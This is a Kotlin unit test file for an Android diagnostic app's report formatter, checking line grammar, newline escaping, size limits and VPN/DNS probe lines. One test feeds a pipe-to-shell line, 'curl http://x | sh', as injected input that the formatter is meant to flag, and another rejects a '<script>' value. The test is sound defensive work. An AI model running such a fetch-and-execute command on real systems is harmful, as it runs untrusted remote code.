package com.october.fixer

import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

class ReportFormatTest {
    @Test fun modelWithNewlineStaysOneLine() =
        assertEquals("device=SM-A155F?vpn.running?true", ReportFormat.line("device", "SM-A155F\nvpn.running=true"))

    @Test fun everyRenderedLineMatchesGrammar() {
        val out = ReportFormat.render(listOf("a=1", "bad line", "b=<script>"))
        assertEquals("a=1", out)
    }

    @Test fun renderCutsOnLineBoundary() {
        val out = ReportFormat.render(List(400) { "k$it=${"x".repeat(40)}" })
        assertTrue(out.length <= 3800)
        assertTrue(out.lines().all { ReportFormat.LINE.matches(it) })
    }

    @Test fun foreignFindsInjectedLine() =
        assertEquals(listOf("curl http://x | sh"), ReportFormat.foreign("a=1\ncurl http://x | sh"))

    @Test fun worstCaseReportFitsAndKeepsEveryProbeLine() {
        val base = listOf(
            "report=sv_fixer_v2", "app.version=1.3", "app.code=13", "device=samsung SM-A155F", "android=14", "android.api=34",
            "vpn.running=true", "vpn.error_code=none", "vpn.allowed_apps=4", "network.transport=cellular",
            "network.validated=true", "network.metered=false", "private_dns=automatic", "probe.scope=outside_vpn",
        )
        val facts = listOf(
            "oneui=60101", "soc=Exynos 1280", "patch=2026-10-01", "user_id=0", "private_dns.active=true",
            "private_dns.provider=google", "net.ipv6=true", "net.nat64=false", "net.other_vpn=false",
            "battery.unrestricted=false", "battery.bg_restricted=false", "standby_bucket=active",
            "roblox.version=2.700.100", "roblox.installed=true",
        )
        val hosts = listOf(
            "tr.rbxcdn.com", "t0.rbxcdn.com", "c0.rbxcdn.com", "thumbnails.roblox.com",
            "game.clashroyaleapp.com", "game.brawlstarsgame.com", "tr.rbxcdn.com_aaaa", "probe.age_s",
        )
        val probes = hosts.mapIndexed { i, h ->
            if (h == "probe.age_s") "probe.age_s=3600"
            else probeLine(h, DnsOutcome("noerror", 4, 35), DnsOutcome("noerror", 4, 90), 4, 4)
        }
        val events = List(16) { "event.${it + 1}=1700000000000,byedpi_died,native_exit" }
        val tun = List(12) { "tun.counter_$it=1234567" }
        val dns = List(24) { "dns.rbx_tr_${"%02d".format(it)}=123456/avg120" }
        val out = ReportFormat.assemble(base, facts, probes, events, tun, dns)
        assertTrue(out.length <= ReportFormat.MAX_CHARS)
        val lines = out.lines()
        assertTrue(lines.count { it.startsWith("probe.") } == 1 + probes.size)
        probes.forEach { assertTrue(it in lines) }
        assertTrue(lines.indexOf(probes.first()) < lines.indexOf(events.first()))
    }

    @Test fun emptyProbesBecomeNotRun() =
        assertTrue("probe.state=not_run" in ReportFormat.assemble(listOf("a=1"), emptyList(), emptyList(), emptyList(), emptyList(), emptyList()).lines())
}
